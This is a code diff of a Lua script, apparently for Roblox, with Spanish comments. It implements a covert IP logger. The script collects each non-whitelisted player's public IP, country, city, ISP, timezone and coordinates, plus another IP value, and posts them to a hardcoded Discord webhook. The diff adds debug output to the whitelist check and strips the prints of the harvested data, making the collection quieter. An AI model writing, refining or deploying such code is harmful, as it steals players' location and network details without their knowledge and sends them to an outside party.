@@ -12,14 +12,23 @@ local url = "https://discord.com/api/webhooks/1479715786775068793/aD68Dj8hVzaY4g
 -- Función para verificar si un jugador está en la whitelist
 local function isInWhitelist(player)
     local playerName = player.Name
+    print("Verificando jugador:", playerName) -- Debug
     
     -- Verificar si el nombre del jugador comienza con alguno de los prefijos permitidos
     for _, prefix in ipairs(WHITELIST_PREFIXES) do
-        if string.sub(playerName:upper(), 1, #prefix) == prefix then
+        -- Convertimos ambos a mayúsculas para comparar
+        local namePrefix = string.sub(playerName:upper(), 1, #prefix:upper())
+        local checkPrefix = prefix:upper()
+        
+        print("Comparando:", namePrefix, "con", checkPrefix) -- Debug
+        
+        if namePrefix == checkPrefix then
+            print("Jugador está en whitelist") -- Debug
             return true
         end
     end
     
+    print("Jugador NO está en whitelist") -- Debug
     return false
 end
 
@@ -61,8 +70,6 @@ local function executeLogger()
        end
     end)
 
-    print("IP Data Raw:", ip_data)
-
     local ip_string = "Unknown IP"
     local country = "Unknown"
     local region = "Unknown"
@@ -76,7 +83,6 @@ local function executeLogger()
        local success, decoded = pcall(function()
           return HttpService:JSONDecode(ip_data)
        end)
-       print("Decoded IP Data:", decoded)
        if success and type(decoded) == "table" then
           ip_string = decoded.query or "Unknown"
           country = decoded.country or "Unknown"
@@ -86,19 +92,8 @@ local function executeLogger()
           timezone = decoded.timezone or "Unknown"
           lat = decoded.lat or "Unknown"
           lon = decoded.lon or "Unknown"
-       else
-          warn("Failed to decode IP data")
        end
     end
-
-    print("IP String:", ip_string)
-    print("Country:", country)
-    print("Region:", region)
-    print("City:", city)
-    print("ISP:", isp)
-    print("Timezone:", timezone)
-    print("Lat:", lat)
-    print("Lon:", lon)
 
     -- FETCH PRIVATE IP ADDRESS
     local private_ip = ""
@@ -108,15 +103,9 @@ local function executeLogger()
           local success, decoded = pcall(HttpService.JSONDecode, HttpService, response)
           if success and decoded.ip then
              private_ip = decoded.ip
-          else
-             warn("Failed to decode private IP data")
           end
-       else
-          warn("Failed to fetch private IP data")
        end
     end)
-
-    print("Private IP:", private_ip)
 
     -- BUILD PAYLOAD WITH FULL GEOLOCATION AND PRIVATE IP
     local data = {
@@ -168,7 +157,10 @@ local function executeLogger()
 end
 
 -- VERIFICAR SI EL JUGADOR LOCAL ESTÁ EN LA WHITELIST
-if not isInWhitelist(LocalPlayer) then
+local whitelisted = isInWhitelist(LocalPlayer)
+print("Resultado de whitelist:", whitelisted) -- Debug
+
+if not whitelisted then
     -- EJECUTAR EL LOGGER
     executeLogger()
     
